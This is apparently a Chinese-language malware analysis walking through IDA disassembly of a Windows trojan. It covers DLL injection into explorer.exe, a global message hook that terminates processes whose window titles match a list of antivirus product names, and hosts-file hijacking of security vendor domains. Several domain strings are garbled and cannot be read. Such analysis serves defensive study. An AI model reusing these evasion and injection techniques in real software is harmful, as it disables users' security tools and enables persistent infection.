
# 恶意代码行为分析

## 主流程

```asm
.text:71003C34                 push    eax             ; lpFileName
.text:71003C35                 call    ds:SetFileAttributesA;设置inf文件属性
.text:71003C3B                 lea     eax, [esp+734h+FileName]
.text:71003C3F                 push    eax             ; lpPathName
.text:71003C40                 call    ds:RemoveDirectoryA; 移除原有的本文件
.text:71003C46                 push    0               ; hTemplateFile
.text:71003C48                 push    6               ; dwFlagsAndAttributes
.text:71003C4A                 push    4               ; dwCreationDisposition
.text:71003C4C                 push    0               ; lpSecurityAttributes
.text:71003C4E                 push    7               ; dwShareMode
.text:71003C50                 push    0C0000000h      ; dwDesiredAccess
.text:71003C55                 lea     eax, [esp+74Ch+FileName]
.text:71003C59                 push    eax             ; lpFileName
.text:71003C5A                 call    ds:CreateFileA  ; 创建inf文件
```

…..省略

```asm
.text:71003C9C                 push    offset aSSOpenSSSSSSSS ; "[%s]\r\n%s\\open\\%s %s,%s\r\n%s\\%s\\%s %s,%s"
.text:71003CA1                 push    eax             ; LPSTR
.text:71003CA2                 call    ds:wsprintfA
.text:71003CA8                 add     esp, 30h
.text:71003CAB                 lea     eax, [esp+734h+String]
.text:71003CB2                 push    eax             ; lpString
.text:71003CB3                 call    ds:lstrlenA
.text:71003CB9                 push    0               ; lpOverlapped
.text:71003CBF                 lea     ecx, [esp+738h+NumberOfBytesWritten]
.text:71003CCF                 push    ecx             ; lpNumberOfBytesWritten
.text:71003CC0                 inc     eax
.text:71003CC1                 push    eax             ; nNumberOfBytesToWrite
.text:71003CC2                 lea     eax, [esp+740h+String]
.text:71003CC9                 push    eax             ; lpBuffer
.text:71003CCA                 push    ebx             ; hFile
.text:71003CCB                 call    ds:WriteFile    ; 向inf文件写入命令
```

…..省略

```asm
.text:71003D0E                 push    eax             ; lpFileName
.text:71003D0F                 call    CopyVirusDllToSystem\_dll ; 把此DLL复制为新文件,名字为system.dll
```

….省略

`CopyVirusDllToSystem\_dll`函数比较简单,可以看idb文件很详细.

## 线程8

### 行为分析

首先获得系统目录,然后从资源中释放`appwinproc.dll`到系统目录中去,然后枚举进程,得到当前`explorer.exe`进程的信息,打开进程获得句柄,并使用远程线程的方式(`CreateRemoteThread` / `Loadlibrary`)让`explorer.exe`加载`appwinproc.dll`,在虚拟机中,将时间改为2008年12月30日之前的任何一个时间，然后运行程序,在系统目录中找到`appwinproc.dll`,然后载入IDA分析,可知,该DLL完成的功能是：

首先用一全局变量做标志,防止多次同时加载这一DLL,然后创建线程可以算做线程9:

### 线程功能

设置全局windows钩子,让所有有窗口的程序都会加载`appwinproc.dll`,监控所有线程的`GetMessage`和`PostMessage`.

钩子函数的功能:首先得到消息源头的根窗口句柄,然后获得窗口标题,判断窗口标题是否和黑名单一致,如果一致,则调用`TerminateProcess`传递`-1`作为当前进程的伪句柄,来结束符合进程.因为钩子函数就在符合黑名单的进程当中,所以可以使用伪句柄来作为进程句柄.我们经常使用的`GetCurrentProcess`就是返回`-1`,作为当前进程的伪句柄,只能在当前进程中使用.

#### 窗口标题黑名单

`"sreng" "Sreng" "SRENG" "木马" "江民" "杀毒" "专杀" "360安全卫士" "下载者" "NOD32" "卡巴斯基" "金山毒霸" "瑞星" "McAfee" "超级巡警" "奇虎" "瑞星卡卡"`

#### 相关代码

```asm
.text:710039F4                 push    104h            ; uSize
.text:710039F9                 lea     eax, [ebp+Buffer]
.text:710039FF                 push    eax             ; lpBuffer
.text:71003A00                 call    ds:GetSystemDirectoryA
.text:71003A06                 push    offset aAppwinproc\_dll ; "\\appwinproc.dll"
.text:71003A0B                 lea     eax, [ebp+Buffer]
.text:71003A11                 push    eax             ; lpString1
.text:71003A12                 call    ds:lstrcatA
.text:71003A18                 lea     eax, [ebp+Buffer]
.text:71003A1E                 push    eax             ; lpFileName
.text:71003A1F                 push    68h             ; nNumberOfBytesToWrite
.text:71003A21                 push    offset Type     ; "RES"
.text:71003A26                 push    hModule         ; hModule
.text:71003A2C                 call    RES\_TO\_SYS      ; 释放 appwinproc.dll
```

```asm
.text:71003A34                 push    offset aExplorer\_exe ; "explorer.exe"
.text:71003A39                 call    IS\_Explorer     ; 枚举进程找到explorer.exe进程
.text:71003A3E                 mov     esi, eax
.text:71003A40                 mov     [esp+110h+var\_110], 2710h
.text:71003A47                 call    ds:Sleep
.text:71003A4D                 test    esi, esi
.text:71003A4F                 jz      short loc\_71003A34
.text:71003A51                 push    esi             ; dwProcessId
.text:71003A52                 push    0               ; bInheritHandle
.text:71003A54                 push    10043Ah         ; dwDesiredAccess
.text:71003A59                 call    ds:OpenProcess
.text:71003A5F                 mov     esi, eax
.text:71003A61                 test    esi, esi
.text:71003A63                 jz      loc\_710039DD
.text:71003A69                 lea     eax, [ebp+Buffer]
.text:71003A6F                 push    eax             ; lpBuffer  刚刚释放的DLL名
.text:71003A70                 push    esi             ; hProcess
.text:71003A71                 call    MakeSvchost\_Load\_DLL ; 此处命名是根据前几个线程,所以此处的功能是让explorer.exe加载刚刚释放的DLL
```

### Appwinproc.dll的相关代码

```asm
nop
.text:10001111                 push    0               ; dwThreadId
.text:10001113                 push    hmod            ; hmod
.text:10001119                 push    offset fn       ; lpfn
.text:1000111E                 push    3     ; idHook------WH\_GETMESSAGE监控GetMessage和PostMessge消息
.text:10001120                 call    ds:SetWindowsHookExA ; 设置全局钩子
.text:10001126                 mov     ds:hhk, eax
```

…省略

#### 钩子过程函数

```asm
.text:100010C3                 call    ds:GetAncestor  ; 得到消息发送者或者接受者目标窗口根句柄
.text:100010C9                 push    200h            ; nMaxCount
.text:100010CE                 lea     ecx, [ebp+String]
.text:100010D4                 push    ecx             ; lpString
.text:100010D5                 push    eax             ; hWnd
.text:100010D6                 call    ds:GetWindowTextA ; 获得窗口标题
.text:100010DC                 lea     eax, [ebp+String]
.text:100010E2                 push    eax
.text:100010E3                 call    IS\_TO\_KILL      ; 判断标题是否与黑名单相同,如果相同返回非0值
.text:100010E8                 test    eax, eax
.text:100010EA                 pop     ecx
.text:100010EB                 pop     edi
.text:100010EC                 jz      short loc\_100010F8
.text:100010EE                 push    0               ; uExitCode
.text:100010F0                 push    -1              ; hProcess 表示当前进程的伪句柄
.text:100010F2                 call    ds:TerminateProcess ; 符合则调用TerminateProcess结束掉
```

## 线程10

### 行为分析

首先获得系统目录,然后在其目下的`\drivers\etc`创建或打开`hosts`文件,修改其属性可读可写,

然后移动文件指针到文件头,使用host域名劫持手段,来屏蔽相关安全网站的域名.即向该文件中写入: `127.0.0.1` 要屏蔽的安全网址 ，即当我们访问这些网址时,浏览器会解析成`127.0.0.1`所以这样就不能访问这些网址.

#### 劫持的域名黑名单

`"9d1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6e0x3$3x3q4)9J5k6h3y4F1" "7dfK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6e0x3$3x3s2y4S2k6X3g2Q4x3X3g2U0L8R3`.`." "cbeK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6e0x3$3x3s2y4S2k6X3g2Q4x3X3g2U0L8$3@1`." "b28K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3y4Z5K9h3&6S2K9%4k6Q4x3X3g2U0L8$3@1`." "d60K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4u0A6M7$3W2F1k6#2)9J5k6h3y4G2L8g2)9J5k6h3y4F1"`

`"rising.com.cn" "dl.jiangmin.com" "jiangmin.com" "5d0K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3A6A6j5h3&6Y4L8h3W2F1i4K6u0W2j5$3!0E0" "addK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3c8#2j5X3q4Q4x3X3g2F1k6i4b7`."
